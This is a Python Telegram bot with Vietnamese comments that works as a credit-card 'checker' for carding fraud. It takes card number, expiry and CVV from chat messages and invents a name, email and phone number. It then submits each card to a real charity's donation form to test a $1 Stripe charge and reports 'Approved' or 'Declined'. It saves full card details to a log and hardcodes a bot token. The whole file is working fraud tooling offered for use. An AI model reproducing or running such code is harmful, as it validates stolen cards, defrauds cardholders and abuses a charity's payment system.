import logging
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import time

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thiết lập nest_asyncio
nest_asyncio.apply()

# Hàm để tạo số ngẫu nhiên trong khoảng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# Hàm để tạo email ngẫu nhiên
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# Hàm để tạo tên ngẫu nhiên
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Hàm để tạo mã bưu điện ngẫu nhiên
def random_zipcode():
    return random_num(1000, 9000)

# Hàm để kiểm tra định dạng thẻ và lấy thông tin
def extract_card_info(card_input):
    # Điều chỉnh biểu thức chính quy để nhận cả năm 2 hoặc 4 chữ số
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        # Nếu ano chỉ có 2 chữ số thì thêm "20" vào trước
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# Hàm để tìm thông báo lỗi trong phản hồi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()  # Trả về thông báo lỗi
    return None

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")

# Hàm xử lý tin nhắn
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    card_info = extract_card_info(user_input)

    if not card_info:
        return  # Nếu không có thông tin thẻ, bot sẽ không trả lời

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if update.effective_user.id not in allowed_users:
        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
        return

    cc, mes, ano, cvv = card_info

    # Kiểm tra tháng và năm hết hạn
    current_year = int(datetime.now().strftime("%y"))  # Lấy 2 chữ số cuối năm hiện tại
    current_full_year = int(datetime.now().strftime("%Y"))  # Lấy 4 chữ số năm hiện tại
    current_month = int(datetime.now().strftime("%m"))  # Lấy tháng hiện tại

    if len(ano) == 2:
        ano = "20" + ano  # Chuyển đổi năm 2 chữ số thành 4 chữ số
    ano = int(ano)

    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
        await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
        return

    phone = random_num(710000009, 900000009)  # Tạo số điện thoại ngẫu nhiên
    email = random_email()  # Tạo email ngẫu nhiên
    name = random_name()  # Tạo tên ngẫu nhiên
    zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên

    await update.message.reply_text("Đang xử lý thông tin...")
    
    start_time = time.time()  # Bắt đầu tính thời gian thực hiện request

    # Gửi yêu cầu tới API
    async with aiohttp.ClientSession() as session:
        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
                                data={
                                    'tfa_4': 'tfa_5',
                                    'tfa_52': 'tfa_53',
                                    'tfa_7': 'tfa_317',
                                    'tfa_19': '1',
                                    'tfa_20': '',
                                    'tfa_21': name,  # Tên ngẫu nhiên
                                    'tfa_23': 'Vu',
                                    'tfa_27': phone,  # Số điện thoại
                                    'tfa_2276': zipcode,  # Mã bưu điện
                                    'tfa_25': email,  # Email
                                    'tfa_48': 'Web',
                                    'tfa_50': 'tfa_50',
                                    'tfa_59': cc,  # Số thẻ
                                    'tfa_60': mes,  # Tháng hết hạn
                                    'tfa_70': ano,  # Năm hết hạn
                                    'tfa_62': cvv,  # CVV
                                    'tfa_2273': 'G-BCL7XEG4WC',
                                    'tfa_2274': 'GTM-WMPTRWL',
                                    'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
                                    'tfa_dbFormId': '151',
                                    'tfa_dbResponseId': '',
                                    'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
                                    'tfa_dbWorkflowSessionUuid': '',
                                    'tfa_dbTimeStarted': '1727426006',
                                    'tfa_dbVersionId': '29',
                                    'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
                                }) as response:

            elapsed_time = time.time() - start_time  # Thời gian thực hiện request
            elapsed_seconds = round(elapsed_time, 2)

            response_text = await response.text()
            final_url = str(response.url)

            if "https://anglicaresa.com.au/success/" in final_url:
                # Giao dịch thành công
                result_message = f"""𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved
𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
            else:
                # Giao dịch thất bại
                error_message = extract_error_message(response_text)
                result_message = f"""Declined 

𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message if error_message else 'Unknown Error'}
𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

            await update.message.reply_text(result_message, parse_mode="HTML")

            # Ghi log
            with open("user_logs.txt", "a") as log_file:
                log_file.write(f"User ID: {update.effective_user.id}, "
                               f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
                               f"Result: {result_message}\n")


# Hàm chính để khởi động bot
if __name__ == '__main__':
    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()
